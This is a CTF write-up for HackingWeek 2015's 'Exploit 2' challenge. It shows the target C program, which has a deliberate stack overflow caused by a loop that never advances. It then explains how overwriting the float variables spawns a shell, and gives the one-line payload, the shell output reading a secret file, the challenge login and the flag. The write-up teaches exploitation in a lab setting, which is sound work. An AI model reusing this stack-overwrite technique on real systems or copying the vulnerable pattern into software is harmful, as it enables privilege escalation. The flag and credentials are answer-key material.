# HackingWeek CTF 2015: Exploit 2

**Category:** exploit |
**Points:** 3870 |
**Solves:** 42 | 
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cach√©e dans le fichier <code>/home/exploit02/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given :

```C
#include <stdio.h>
#include <stdlib.h>

int
main (int argc, char **argv)
{
  if (argc < 3)
    {
      fprintf (stderr, "error: missing argument ! Usage: ./vulnerable 10 AAA\n");
      exit (EXIT_FAILURE);
    }

  int size = atoi(argv[1]);
  float fsize = ((float) size) / 100;
  if (size > 1024)
    {
      fprintf (stderr, "error: cannot go more than 1024 !\n");
      exit (EXIT_FAILURE);
    }
  else if (size < 0)
    {
      fprintf (stderr, "error: cannot be a negative number !\n");
      exit (EXIT_FAILURE);
    }

  float x;
  int i = 0;
  char buffer[1024];

  for (x = 0; x < fsize; x + 0.01)
    buffer[i++] = argv[2][0];

  for (i = 0; i < size; i++)
    printf(" %c", buffer[i]);
  fputs("\n", stdout);

  if (x > 80000000000000000000000000000000000000.0)
    system ("/bin/sh");

  return EXIT_SUCCESS;
}
```		

This one is a bit trickier, because it is rather a mistake than an actual
vulnerability. You may not have noticed, but the first for loop has `x + 0.01`
instead of `x += 0.01`.  
At first sight, we thought it was a compiler feature, but it was not :  
The program puts `argv[1][0]` in buffer for ever... until it overwrites other
variables.  
What happens here is that we will overwrite variables.  
In the memory, stack, which contains every local variables, looks like this :
```
+--------+---+-------+------+---+----+----+
| buffer | x | fsize | size | i | bp | ip |
+--------+---+-------+------+---+----+----+
```
(You can figure this out by using a disassembler)

We can see that the loop will write buffer, then x, then fsize.  
When you overwrite fsize, the loop will end, since the condition will be
fullfilled.  
All we need is the hexadecimal representation of a float over 8000... that can
be written with the same char 4 times.  
There are different ways to find it. We did it by trying common values
(eg: 0xFF, 0x80, 0x7F)  
`./vulnerable 1 $'\x7f'`
>  
>  
> sh-4.2$ `whoami; cat ../.secret`  
> exploit02  
> cai0Aexee3

**Flag**: cai0Aexee3
